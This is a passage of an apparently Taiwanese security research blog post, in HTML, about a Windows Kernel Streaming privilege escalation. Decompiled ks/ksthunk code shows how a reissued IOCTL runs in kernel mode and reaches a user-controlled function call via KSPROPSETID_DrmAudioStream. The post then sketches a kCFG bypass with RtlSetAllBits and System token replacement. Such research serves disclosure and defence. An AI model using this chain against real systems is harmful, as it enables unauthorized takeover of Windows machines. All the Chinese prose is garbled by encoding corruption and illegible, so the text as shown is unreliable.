&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240823/22.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;ä¸Šåœ–ä¸­å¯ä»¥çœ‹åˆ°ï¼Œåœ¨ ks è™•ç† Property æ™‚ï¼Œå¦‚æœæœ‰çµ¦ä¸Šè¿°çš„ flag å°±æœƒç”± UnserializePropertySet ä¾†è™•ç†ä½ çš„ request&lt;/p&gt;

&lt;p&gt;æˆ‘å€‘é€™é‚Šå°±å…ˆä¾†çœ‹ä¸€ä¸‹ UnserializePropertySet&lt;/p&gt;

&lt;div class=&quot;language-cpp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;__int64&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;__fastcall&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;UnserializePropertySet&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;PIRP&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;irp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;KSIDENTIFIER&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;UserProvideProperty&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;KSPROPERTY_SET&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;propertyset_&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;New_KsProperty_req&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ExAllocatePoolWithTag&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;NonPagedPoolNx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;InSize&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x7070534Bu&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;memmove&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;New_KsProperty_req&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;CurrentStackLocation&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Parameters&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;DeviceIoControl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Type3InputBuffer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;InSize&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;//------[1] &lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;status&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;KsSynchronousIoControlDevice&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;CurrentStackLocation&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;FileObject&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
            &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;CurrentStackLocation&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Parameters&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;DeviceIoControl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;IoControlCode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;New_KsProperty_req&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;InSize&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;OutBuffer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;OutSize&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
            &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;BytesReturned&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;//-----------[2]&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;å¯çœ‹åˆ°åœ¨è™•ç†éç¨‹ä¸­æœƒå…ˆå°‡åŸå§‹çš„ requestï¼Œè¤‡è£½åˆ°æ–°åˆ†é…å‡ºä¾†çš„ Buffer ä¸­ [1]ï¼Œè€Œå¾ŒçºŒå°±æœƒä½¿ç”¨é€™å€‹ Buffer ä¾†ä½¿ç”¨ KsSynchronousIoControlDevice å‘¼å«æ–°çš„ IOCTL [2]ã€‚å…¶ä¸­ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;New_KsProperty_req&lt;/code&gt; åŠ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;OutBuffer&lt;/code&gt; éƒ½æ˜¯ä½¿ç”¨è€…æ‰€å‚³å…¥çš„å…§å®¹ã€‚&lt;/p&gt;

&lt;p&gt;è€Œå‘¼å« UnserializePropertySet æ™‚çš„æµç¨‹ï¼Œå¤§æ¦‚å¦‚ä¸‹åœ–æ‰€ç¤º :&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240823/23.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;é€™é‚Šå‘¼å« IOCTL æ™‚å¯ä»¥çœ‹åˆ°åœ–ä¸­ç¬¬ 2 æ­¥ I/O Manager æœƒå°‡ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Irp-&amp;gt;RequestorMode&lt;/code&gt; è¨­æˆ UserMode(1)ï¼Œç›´åˆ°ç¬¬ 6 æ­¥æ™‚ï¼Œks æœƒå»åˆ¤æ–·ä½¿ç”¨è€… requests çš„ Property æ˜¯å¦å­˜åœ¨æ–¼è©² KS Object ä¸­ï¼Œå¦‚æœè©² KS Object çš„ Property &lt;strong&gt;å­˜åœ¨&lt;/strong&gt;ï¼Œä¸¦ä¸”æœ‰è¨­ç½® &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;KSPROPERTY_TYPE_UNSERIALIZESET&lt;/code&gt; å°±æœƒç”¨ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;UnserializePropertySet&lt;/code&gt; ä¾†è™•ç†æŒ‡å®šçš„ Property&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240823/24.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;è€Œæ¥ä¸‹ä¾†ç¬¬ 7 æ­¥å°±æœƒå‘¼å« KsSynchronousIoControlDevice é‡æ–°åšä¸€æ¬¡  IOCTLï¼Œè€Œæ­¤æ™‚æ–°çš„ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Irp-&amp;gt;RequestorMode&lt;/code&gt; å°±è®Šæˆäº† KernelMode(0) äº†ï¼Œè€Œå¾ŒçºŒçš„è™•ç†å°±å¦‚ä¸€èˆ¬çš„ IOCTL_KS_PROPERTY ç›¸åŒï¼Œå°±ä¸å¦å¤–è©³è¿°äº†ï¼Œç¸½ä¹‹æˆ‘å€‘åˆ°é€™è£¡å·²ç¶“æœ‰å€‹å¯ä»¥ä»»æ„åš IOCTL_KS_PROPERTY çš„ primitive äº†ï¼Œæ¥ä¸‹ä¾†æˆ‘å€‘å¿…é ˆå°‹æ‰¾çœ‹çœ‹æ˜¯å¦æœ‰å¯ä»¥ EoP çš„åœ°æ–¹ã€‚&lt;/p&gt;

&lt;h3 id=&quot;the-eop&quot;&gt;The EoP&lt;/h3&gt;
&lt;p&gt;æœ€å…ˆçœ‹åˆ°çš„æƒ³å¿…å°±æ˜¯å…¥å£é» ksthunkï¼Œæˆ‘å€‘é€™é‚Šå¯ä»¥ç›´æ¥ä¾†çœ‹ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ksthunk!CKSThunkDevice::DispatchIoctl&lt;/code&gt;&lt;/p&gt;

&lt;div class=&quot;language-cpp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;
&lt;span class=&quot;n&quot;&gt;__int64&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;__fastcall&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;CKSThunkDevice&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;DispatchIoctl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;CKernelFilterDevice&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;a1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;IRP&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;irp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;a3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;NTSTATUS&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;a4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;IoIs32bitProcess&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;irp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;irp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;RequestorMode&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;//------[3]&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
   &lt;span class=&quot;c1&quot;&gt;//Convert 32-bit requests to 64-bit requests&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;CurrentStackLocation&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Parameters&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;DeviceIoControl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;IoControlCode&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;IOCTL_KS_PROPERTY&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;CKSThunkDevice&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;CheckIrpForStackAdjustmentNative&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;__int64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;a1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;irp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v11&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;a4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;//-----[4];&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;


&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;ksthunk æœƒå…ˆåˆ¤æ–·æ˜¯å¦æ˜¯ WoW64 çš„ Process çš„ requestï¼Œå¦‚æœæ˜¯å°±æœƒå°‡åŸæœ¬ 32-bit çš„ requests  è½‰æ›æˆ 64-bit çš„ [3]ï¼Œå¦‚æœåŸæœ¬å°±æ˜¯ 64-bit å‰‡æœƒå‘¼å« &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;CKSThunkDevice::CheckIrpForStackAdjustmentNative&lt;/code&gt; [4] å¾€ä¸‹å‚³é&lt;/p&gt;

&lt;div class=&quot;language-cpp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;__int64&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;__fastcall&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;CKSThunkDevice&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;CheckIrpForStackAdjustmentNative&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;__int64&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;a1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;_IRP&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;irp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;__int64&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;a3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;a4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_OWORD&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Type3InputBuffer&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Set&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_OWORD&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;KSPROPSETID_DrmAudioStream&lt;/span&gt;
        &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;type3inputbuf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Id&lt;/span&gt;
        &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;type3inputbuf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Flags&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;   &lt;span class=&quot;c1&quot;&gt;//-----[5]   &lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;irp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;RequestorMode&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;//-------[6]&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;v14&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xC0000010&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;UserBuffer&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;irp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;UserBuffer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;v14&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;__int64&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kr&quot;&gt;__fastcall&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_QWORD&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_QWORD&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;__int64&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Type3InputBuffer&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x38&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))(&lt;/span&gt;&lt;span class=&quot;c1&quot;&gt;// call Type3InputBuffer+0x38&lt;/span&gt;
                &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;UserBuffer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
                &lt;span class=&quot;mi&quot;&gt;0LL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;v19&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;//------------[7]&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; 
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;æˆ‘å€‘åœ¨ [5] çœ‹åˆ°ï¼Œå¦‚æœæˆ‘å€‘çµ¦å®šçš„ Property Set æ˜¯ &lt;a href=&quot;https://learn.microsoft.com/mt-mt/windows-hardware/drivers/audio/kspropsetid-drmaudiostream&quot;&gt;KSPROPSETID_DrmAudioStream&lt;/a&gt; ï¼Œå°±æœ‰ç‰¹åˆ¥çš„è™•ç†ã€‚è€Œåœ¨ [6] æ™‚ï¼Œæœƒå…ˆå»åˆ¤æ–· Irp-&amp;gt;RequestorMode æ˜¯å¦ç‚º KernelMode(0)ï¼Œå¦‚æœå¾ UserMode(1) å‘¼å«çš„ IOCTL å°±æœƒç›´æ¥è¿”å›éŒ¯èª¤ï¼Œä½†å¦‚æœæˆ‘å€‘ä½¿ç”¨å‰é¢æ‰€èªªçš„ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;KSPROPERTY_TYPE_UNSERIALIZESET&lt;/code&gt; ä¾†å‘¼å« IOCTLï¼Œä¸¦æŒ‡å®š &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;KSPROPSETID_DrmAudioStream&lt;/code&gt; é€™å€‹ Propertyï¼Œé‚£éº¼é€™è£¡ [6] å°±æœƒæ˜¯ KerenlMode(0)ã€‚æ¥ä¸‹ä¾†å°±æœƒåœ¨ [7] ç›´æ¥ä½¿ç”¨ä½¿ç”¨è€…æ‰€å‚³å…¥çš„å…§å®¹åšç‚º function å‘¼å«ï¼Œç”šè‡³ç¬¬ä¸€å€‹åƒæ•¸æ˜¯å¯æ§çš„ï¼Œå¯¦éš›å¯« PoC å¾Œï¼Œé©—è­‰äº†æˆ‘å€‘çš„çµæœã€‚&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240823/25.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;é€™é‚Šå¯èƒ½æœƒæœ‰äººæœ‰ç–‘æƒ‘ï¼Œä»€éº¼è¨­å‚™æˆ–æ˜¯æƒ…æ³ä¸‹æœƒæœ‰ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;KSPROPSETID_DrmAudioStream&lt;/code&gt; ï¼Ÿå¯¦éš›ä¸Šä¾†èªªéŸ³è¨Šè¨­å‚™å¤§å¤šæƒ…æ³ä¸‹éƒ½æœƒæœ‰ï¼Œä¸»è¦æ˜¯ç”¨ä¾†è¨­ç½® DRM ç›¸é—œå…§å®¹ç”¨çš„ã€‚&lt;/p&gt;

&lt;h3 id=&quot;exploitation&quot;&gt;Exploitation&lt;/h3&gt;
&lt;p&gt;åœ¨æœ‰äº†ä»»æ„å‘¼å«ä¹‹å¾Œï¼Œè¦é”æˆ EoP å°±ä¸æ˜¯å¤ªå¤§çš„å•é¡Œï¼Œé›–ç„¶æœƒé‡åˆ° kCFGã€kASLRã€SMEP ç­‰ç­‰ä¿è­·ï¼Œä½†åœ¨ Medium IL ä¸‹å”¯ä¸€æ¯”è¼ƒéœ€è¦è™•ç†çš„å°±åªæœ‰ kCFGã€‚&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;strong&gt;kCFG&lt;/strong&gt;&lt;/li&gt;
  &lt;li&gt;kASLR
    &lt;ul&gt;
      &lt;li&gt;NtQuerySystemInformation&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;SMEP
    &lt;ul&gt;
      &lt;li&gt;Reuse Kernel Code&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;â€¦&lt;/li&gt;
&lt;/ul&gt;

&lt;h4 id=&quot;bypass-kcfg&quot;&gt;Bypass kCFG&lt;/h4&gt;
&lt;p&gt;é‚£æˆ‘å€‘ç›®æ¨™å¾ˆç°¡å–®ï¼Œå°±æ˜¯å¾åˆæ³•çš„ function åšå‡ºä»»æ„å¯«çš„ primitiveï¼Œè€Œä¹‹å¾Œå°±å¯ä»¥åˆ©ç”¨å¸¸è¦‹çš„æ–¹æ³•&lt;a href=&quot;https://www.ired.team/miscellaneous-reversing-forensics/windows-kernel-internals/how-kernel-exploits-abuse-tokens-for-privilege-escalation#id-1.-replacing-tokens-for-privilege-escalation&quot;&gt;ç”¨ System token å–ä»£ç•¶å‰çš„ Process token&lt;/a&gt; æˆ–æ˜¯ &lt;a href=&quot;https://media.blackhat.com/bh-us-12/Briefings/Cerrudo/BH_US_12_Cerrudo_Windows_Kernal_Slides.pdf&quot;&gt;Abuse token privilege&lt;/a&gt; å»åšåˆ° EoPã€‚&lt;/p&gt;

&lt;p&gt;ç›´è¦ºåœ°æœƒç›´æ¥å»æ‰¾çœ‹çœ‹ï¼ŒkCFG ä¸­åˆæ³•çš„ function åç¨±æœ‰ set çš„ functionï¼Œæ¯”è¼ƒå¯èƒ½æ˜¯å¯ä»¥å¯«å…¥çš„ã€‚æˆ‘å€‘é€™è£¡æ˜¯ç›´æ¥æ‹¿ ntoskrnl.exe ä¸­ export fucntion å»å°‹æ‰¾çœ‹çœ‹æ˜¯å¦æœ‰åˆæ³•çš„ functionï¼Œé€™äº›å¤§å¤šæƒ…æ³ä¸‹éƒ½æ˜¯åˆæ³•çš„ã€‚&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240823/26.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;è€Œå¾ˆå¿«çš„æˆ‘å€‘å°±æ‰¾åˆ°äº† &lt;a href=&quot;https://learn.microsoft.com/zh-tw/windows-hardware/drivers/ddi/wdm/nf-wdm-rtlsetallbits&quot;&gt;RtlSetAllBits&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240823/27.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

